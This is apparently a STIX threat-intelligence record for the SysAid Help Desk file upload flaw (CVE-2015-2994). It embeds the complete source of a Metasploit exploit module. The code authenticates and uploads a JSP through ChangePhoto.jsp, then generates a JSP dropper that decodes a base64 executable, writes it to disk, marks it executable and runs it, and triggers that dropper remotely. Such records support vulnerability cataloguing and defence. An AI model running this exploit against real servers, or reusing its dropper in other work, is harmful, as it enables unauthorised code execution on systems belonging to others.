{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ab954e49-1ab8-40a9-8a66-33d7b64f3199",
    "created": "2024-08-14T17:10:33.776967Z",
    "modified": "2024-08-14T17:10:33.776971Z",
    "name": "SysAid Help Desk Administrator Portal Arbitrary File Upload",
    "description": " This module exploits a file upload vulnerability in SysAid Help Desk. The vulnerability exists in the ChangePhoto.jsp in the administrator portal which does not correctly handle directory traversal sequences and does not enforce file extension restrictions. While an attacker needs an administrator account in order to leverage this vulnerability, there is a related Metasploit auxiliary module which can create this account under some circumstances. This module has been tested in SysAid v14.4 in both Linux and Windows. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/sysaid_auth_file_upload.rb",
            "external_id": "sysaid_auth_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2994"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2015/Jun/8"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'SysAid Help Desk Administrator Portal Arbitrary File Upload',\n      'Description' => %q{\n        This module exploits a file upload vulnerability in SysAid Help Desk.\n        The vulnerability exists in the ChangePhoto.jsp in the administrator portal,\n        which does not correctly handle directory traversal sequences and does not\n        enforce file extension restrictions. While an attacker needs an administrator\n        account in order to leverage this vulnerability, there is a related Metasploit\n        auxiliary module which can create this account under some circumstances.\n        This module has been tested in SysAid v14.4 in both Linux and Windows.\n      },\n      'Author'       =>\n        [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2015-2994'],\n          ['URL', 'https://seclists.org/fulldisclosure/2015/Jun/8']\n        ],\n      'DefaultOptions' => { 'WfsDelay' => 5 },\n      'Privileged'  => false,\n      'Platform'    => %w{ linux win },\n      'Arch' => ARCH_X86,\n      'Targets'     =>\n        [\n          [ 'Automatic', { } ],\n          [ 'SysAid Help Desk v14.4 / Linux',\n            {\n              'Platform' => 'linux'\n            }\n          ],\n          [ 'SysAid Help Desk v14.4 / Windows',\n            {\n              'Platform' => 'win'\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2015-06-03'))\n\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'The target port', 8080]),\n        OptString.new('TARGETURI', [ true,  \"SysAid path\", '/sysaid']),\n        OptString.new('USERNAME', [true, 'The username to login as']),\n        OptString.new('PASSWORD', [true, 'Password for the specified username']),\n      ])\n  end\n\n\n  def check\n    res = send_request_cgi({\n      'uri'    => normalize_uri(datastore['TARGETURI'], 'errorInSignUp.htm'),\n      'method' => 'GET'\n    })\n    if res && res.code == 200 && res.body.to_s =~ /css\\/master\\.css\\?v([0-9]{1,2})\\.([0-9]{1,2})/\n      major = $1.to_i\n      minor = $2.to_i\n      if major == 14 && minor == 4\n        return Exploit::CheckCode::Appears\n      elsif major > 14\n        return Exploit::CheckCode::Safe\n      end\n    end\n    # Haven't tested in versions < 14.4, so we don't know if they are vulnerable or not\n    return Exploit::CheckCode::Unknown\n  end\n\n\n  def authenticate\n    res = send_request_cgi({\n      'uri'    => normalize_uri(datastore['TARGETURI'], 'Login.jsp'),\n      'method' => 'POST',\n      'vars_post' => {\n        'userName' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD']\n      }\n    })\n\n    if res && res.code == 302 && res.get_cookies\n      return res.get_cookies\n    else\n      return nil\n    end\n  end\n\n\n  def upload_payload(payload, is_exploit)\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(payload,\n      'application/octet-stream', 'binary',\n      \"form-data; name=\\\"#{Rex::Text.rand_text_alpha(4+rand(8))}\\\"; filename=\\\"#{Rex::Text.rand_text_alpha(4+rand(10))}.jsp\\\"\")\n\n    data = post_data.to_s\n\n    if is_exploit\n      print_status(\"Uploading payload...\")\n    end\n\n    res = send_request_cgi({\n      'uri'    => normalize_uri(datastore['TARGETURI'], 'ChangePhoto.jsp'),\n      'method' => 'POST',\n      'cookie' => @cookie,\n      'data'   => data,\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'vars_get' => { 'isUpload' => 'true' }\n    })\n\n    if res && res.code == 200 && res.body.to_s =~ /parent.glSelectedImageUrl = \\\"(.*)\\\"/\n      if is_exploit\n        print_good(\"Payload uploaded successfully\")\n      end\n\n      return $1\n    else\n      return nil\n    end\n  end\n\n  def pick_target\n    unless target.name == 'Automatic'\n      return target\n    end\n\n    print_status(\"Determining target\")\n    os_finder_payload = %Q{<html><body><%out.println(System.getProperty(\"os.name\"));%></body><html>}\n    url = upload_payload(os_finder_payload, false)\n\n    res = send_request_cgi({\n      'uri'    => normalize_uri(datastore['TARGETURI'], url),\n      'method' => 'GET',\n      'cookie' => @cookie,\n      'headers' => { 'Referer' => Rex::Text.rand_text_alpha(10 + rand(10)) }\n    })\n\n    if res && res.code == 200\n      if res.body.to_s =~ /Linux/\n        register_files_for_cleanup('webapps/' + url)\n        return targets[1]\n      elsif res.body.to_s =~ /Windows/\n        register_files_for_cleanup('root/' + url)\n        return targets[2]\n      end\n    end\n\n    nil\n  end\n\n  def generate_jsp_payload\n    opts = {:arch => @my_target.arch, :platform => @my_target.platform}\n    exe = generate_payload_exe(opts)\n    base64_exe = Rex::Text.encode_base64(exe)\n\n    native_payload_name = rand_text_alpha(rand(6)+3)\n    ext = (@my_target['Platform'] == 'win') ? '.exe' : '.bin'\n\n    var_raw     = rand_text_alpha(rand(8) + 3)\n    var_ostream = rand_text_alpha(rand(8) + 3)\n    var_buf     = rand_text_alpha(rand(8) + 3)\n    var_decoder = rand_text_alpha(rand(8) + 3)\n    var_tmp     = rand_text_alpha(rand(8) + 3)\n    var_path    = rand_text_alpha(rand(8) + 3)\n    var_proc2   = rand_text_alpha(rand(8) + 3)\n\n    if @my_target['Platform'] == 'linux'\n      var_proc1 = Rex::Text.rand_text_alpha(rand(8) + 3)\n      chmod = %Q|\n      Process #{var_proc1} = Runtime.getRuntime().exec(\"chmod 777 \" + #{var_path});\n      Thread.sleep(200);\n      |\n\n      var_proc3 = Rex::Text.rand_text_alpha(rand(8) + 3)\n      cleanup = %Q|\n      Thread.sleep(200);\n      Process #{var_proc3} = Runtime.getRuntime().exec(\"rm \" + #{var_path});\n      |\n    else\n      chmod = ''\n      cleanup = ''\n    end\n\n    jsp = %Q|\n    <%@page import=\"java.io.*\"%>\n    <%@page import=\"sun.misc.BASE64Decoder\"%>\n    <%\n    try {\n      String #{var_buf} = \"#{base64_exe}\";\n      BASE64Decoder #{var_decoder} = new BASE64Decoder();\n      byte[] #{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());\n\n      File #{var_tmp} = File.createTempFile(\"#{native_payload_name}\", \"#{ext}\");\n      String #{var_path} = #{var_tmp}.getAbsolutePath();\n\n      BufferedOutputStream #{var_ostream} =\n        new BufferedOutputStream(new FileOutputStream(#{var_path}));\n      #{var_ostream}.write(#{var_raw});\n      #{var_ostream}.close();\n      #{chmod}\n      Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path});\n      #{cleanup}\n    } catch (Exception e) {\n    }\n    %>\n    |\n\n    jsp = jsp.gsub(/\\n/, '')\n    jsp = jsp.gsub(/\\t/, '')\n    jsp = jsp.gsub(/\\x0d\\x0a/, '')\n    jsp = jsp.gsub(/\\x0a/, '')\n\n    return jsp\n  end\n\n  def exploit\n    @cookie = authenticate\n    unless @cookie\n      fail_with(Failure::NoAccess, \"#{peer} - Unable to authenticate with the provided credentials.\")\n    end\n    print_good(\"Authentication was successful with the provided credentials.\")\n\n    @my_target = pick_target\n    if @my_target.nil?\n      fail_with(Failure::NoTarget, \"#{peer} - Unable to select a target, we must bail.\")\n    end\n    print_status(\"Selected target #{@my_target.name}\")\n\n    # When using auto targeting, MSF selects the Windows meterpreter as the default payload.\n    # Fail if this is the case and ask the user to select an appropriate payload.\n    if @my_target['Platform'] == 'linux' && payload_instance.name =~ /Windows/\n      fail_with(Failure::BadConfig, \"#{peer} - Select a compatible payload for this Linux target.\")\n    end\n\n    jsp_payload = generate_jsp_payload\n    jsp_path = upload_payload(jsp_payload, true)\n    unless jsp_path\n      fail_with(Failure::Unknown, \"#{peer} - Payload upload failed\")\n    end\n\n    if @my_target == targets[1]\n      register_files_for_cleanup('webapps/' + jsp_path)\n    else\n      register_files_for_cleanup('root/' + jsp_path)\n    end\n\n    print_status(\"Executing payload...\")\n    send_request_cgi({\n      'uri'    => normalize_uri(datastore['TARGETURI'], jsp_path),\n      'method' => 'GET',\n      'cookie' => @cookie,\n      'headers' => { 'Referer' => Rex::Text.rand_text_alpha(10 + rand(10)) }\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-06-03",
    "x_mitre_platforms": [
        "win"
    ]
}